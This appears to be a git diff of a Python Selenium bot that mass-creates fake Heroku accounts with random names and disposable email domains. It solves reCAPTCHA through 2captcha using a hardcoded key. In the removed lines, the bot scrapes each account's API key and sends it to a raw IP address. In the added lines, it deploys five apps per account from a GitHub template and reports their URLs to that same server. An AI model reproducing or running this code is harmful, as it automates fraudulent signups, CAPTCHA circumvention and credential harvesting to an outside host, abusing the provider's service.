@@ -43,27 +43,28 @@ def pregetmidstring(pre, html, start_str, end):
             return html[start:end].strip()
 
 if __name__ == '__main__':
-    for i in range(16):
+    sum = 0
+    with open('account.txt', 'a') as f1:
+        f1.write("\n#Start")
+    while True:
+        browser = webdriver.Chrome(executable_path=chromedriver, chrome_options=options)
+        if sum == 5:
+            break
         try:
-            browser = webdriver.Chrome(executable_path=chromedriver, chrome_options=options)
             username = ''.join(random.sample(string.ascii_letters, 10)).lower()
             browser.implicitly_wait(20)
-            browser.get('http://bookmorpho.tk/')
-            browser.find_element(By.CSS_SELECTOR, "a#customShortid").click()
-            time.sleep(0.5)
-            browser.find_element(By.CSS_SELECTOR, "input#shortid").clear()
-            time.sleep(0.5)
-            browser.find_element(By.CSS_SELECTOR, "input#shortid").send_keys(username)
-            time.sleep(0.5)
-            browser.find_element(By.CSS_SELECTOR, "a#customShortid").click()
+            browser.get('http://sssdre2.net/')
+            browser.find_element(By.CSS_SELECTOR,"a#customShortid").click()
+            browser.find_element(By.CSS_SELECTOR,"input#shortid").clear()
+            browser.find_element(By.CSS_SELECTOR,"input#shortid").send_keys(username)
+            browser.find_element(By.CSS_SELECTOR,"a#customShortid").click()
+            browser.refresh()
             browser.execute_script('window.open("https://signup.heroku.com/");')
             handles = browser.window_handles
             browser.switch_to.window(handles[1])
-            browser.find_element(By.NAME, "first_name").send_keys(
-                ''.join(random.sample(string.ascii_letters, 10)).upper())
-            browser.find_element(By.NAME, "last_name").send_keys(
-                ''.join(random.sample(string.ascii_letters, 10)).upper())
-            browser.find_element(By.NAME, "email").send_keys(username + "@bookmorpho.tk")
+            browser.find_element(By.NAME, "first_name").send_keys(''.join(random.sample(string.ascii_letters, 10)).upper())
+            browser.find_element(By.NAME, "last_name").send_keys(''.join(random.sample(string.ascii_letters, 10)).upper())
+            browser.find_element(By.NAME, "email").send_keys(username + "@sssdre2.net")
             Select(browser.find_element(By.NAME, "role")).select_by_value("professional_developer")
             Select(browser.find_element(By.NAME, "self_declared_country")).select_by_value("United States")
             Select(browser.find_element(By.NAME, "main_programming_language")).select_by_value("go")
@@ -79,42 +80,44 @@ if __name__ == '__main__':
             getdataurl = "https://2captcha.com/res.php?key=5d9e13e461a60a913a107ad3e82c5719&action=get&id={0}&json=1".format(
                 randomdata)
             requestdata = ""
-            flag = 0
             while True:
                 result = eval(requests.get(getdataurl).text)
                 print(result)
-                if result['request'] == "ERROR_WRONG_CAPTCHA_ID":
-                    flag = 1
-                    break
                 if result['status'] == 1:
                     requestdata = result['request']
                     break
-            if flag == 1:
-                continue
             browser.execute_script('document.getElementById("g-recaptcha-response").innerHTML="%s";' % requestdata)
             try:
-                browser.find_element(By.ID, "onetrust-accept-btn-handler").click()
+                browser.find_element(By.ID,"onetrust-accept-btn-handler").click()
             except:
                 pass
             browser.find_element(By.CSS_SELECTOR,
                                  "body > div.wrapper > div > div.signup-content > div.signup.page-sidebar > form > div:nth-child(14) > input").click()
             browser.switch_to.window(handles[0])
-            browser.find_element(By.CSS_SELECTOR, "#epostalar > ul > li.mail.active > a > div.baslik").click()
+            browser.find_element(By.CSS_SELECTOR,"#epostalar > ul > li.mail.active > a > div.baslik").click()
             html = str(browser.page_source.encode('utf-8'))
-            signup = getmidstring(html, "<a href=\"https://id.heroku.com/account/accept/", "\"")
-            signup = "https://id.heroku.com/account/accept/" + signup
+            signup = getmidstring(html,"<a href=\"https://id.heroku.com/account/accept/","\"")
+            signup = "https://id.heroku.com/account/accept/"+signup
             browser.get(signup)
-            browser.find_element(By.ID, "user_password").send_keys("*Z8Y^ZUlW")
-            browser.find_element(By.ID, "user_password_confirmation").send_keys("*Z8Y^ZUlW")
-            browser.find_element(By.CSS_SELECTOR,
-                                 "body > div.wrapper > div > div.account-content > div > form > div:nth-child(8) > input").click()
-            browser.find_element(By.CSS_SELECTOR, "#final_login > div > input").click()
-            browser.find_element(By.CSS_SELECTOR, "#ember15").click()
-            time.sleep(1)
-            browser.get("https://dashboard.heroku.com/account")
-            browser.find_element(By.CSS_SELECTOR, "#ember46").click()
-            apikey = browser.find_element(By.CSS_SELECTOR, "#ember47").get_attribute("value")
-            requests.get("http://119.28.43.199/nmsl.php?getgetget=%s" % apikey)
+            browser.find_element(By.ID,"user_password").send_keys("*Z8Y^ZUlW")
+            browser.find_element(By.ID,"user_password_confirmation").send_keys("*Z8Y^ZUlW")
+            browser.find_element(By.CSS_SELECTOR,"body > div.wrapper > div > div.account-content > div > form > div:nth-child(8) > input").click()
+            browser.find_element(By.CSS_SELECTOR,"#final_login > div > input").click()
+            browser.find_element(By.CSS_SELECTOR,"#ember15").click()
+            a = []
+            for i in range(1,6):
+                tmp = ''.join(random.sample(string.ascii_letters, 16)).lower()
+                browser.get("https://dashboard.heroku.com/new?template=https://github.com/niniubiwoc/azure-b")
+                browser.find_element(By.CSS_SELECTOR,"#ember25").send_keys(tmp)
+                html = str(browser.page_source.encode('utf-8'))
+                emb = pregetmidstring(html.find("<div class=\"template-deploy\">")+len("<div class=\"template-deploy\">"),html,"<button id=\"","\"")
+                browser.find_element(By.ID,emb).click()
+                while True:
+                    html = str(browser.page_source.encode('utf-8'))
+                    if html.find("Your app was successfully deployed.") != -1:
+                        break
+                requests.get("http://119.28.43.199:8888/nmsl.php?getgetget=https://%s.herokuapp.com/" % tmp)
+                sum = sum + 1
             browser.quit()
         except:
             browser.quit()
